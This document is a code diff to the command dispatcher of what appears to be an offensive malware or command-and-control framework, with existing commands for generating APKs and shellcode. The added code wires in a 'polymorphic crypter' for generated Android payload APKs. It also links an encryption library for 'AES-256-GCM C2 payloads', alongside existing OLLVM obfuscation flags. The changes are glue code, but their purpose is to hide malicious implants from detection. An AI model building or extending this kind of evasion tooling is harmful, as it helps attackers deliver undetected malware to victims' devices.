@@ -204,6 +204,7 @@ class Input:
                 "up-service-db": cls._handle_service_migration,
                 "generate-apk": cls._generate_apk,
                 "generate-apk-buildozer": cls._generate_apk_buildozer,
+                "apk-crypter": cls._run_apk_crypter,
                 "generate-shellcode": cls._generate_shellcode,
                 "compile": cls._compile_c_binary,
                 "kaslr": cls._kaslr_calculator,
@@ -506,6 +507,21 @@ class Input:
         except Exception as e:
             ToStdout.write(f"[-] Buildozer generation failed: {e}\n")
             Error(traceback.format_exc())
+
+    @classmethod
+    def _run_apk_crypter(cls, data):
+        """Passes a generated APK through the polymorphic crypter."""
+        import shlex
+        parts = shlex.split(data)
+        if len(parts) < 3:
+            ToStdout.write("[-] Usage: apk-crypter <input.apk> <output.apk>\n")
+            return
+            
+        cmd = [sys.executable, os.path.join(installation, "source", "tools", "android_payload_generators", "apk_crypter.py"), "-i", parts[1], "-o", parts[2]]
+        try:
+            subprocess.run(cmd)
+        except Exception as e:
+            ToStdout.write(f"[-] Failed to launch APK Crypter: {e}\n")
 
     @classmethod
     def _generate_shellcode(cls, data):
@@ -895,6 +911,9 @@ class Input:
             if comp_static:
                 cmd.append('-static')
             
+            # Link OpenSSL Crypto library for AES-256-GCM C2 payloads
+            cmd.append('-lcrypto')
+
             if ollvm_enabled:
                 ToStdout.write("[*] OLLVM_ENABLED=true: Applying control flow flattening...\n")
                 cmd.extend(["-mllvm", "-bcf", "-mllvm", "-sub", "-mllvm", "-fla"])
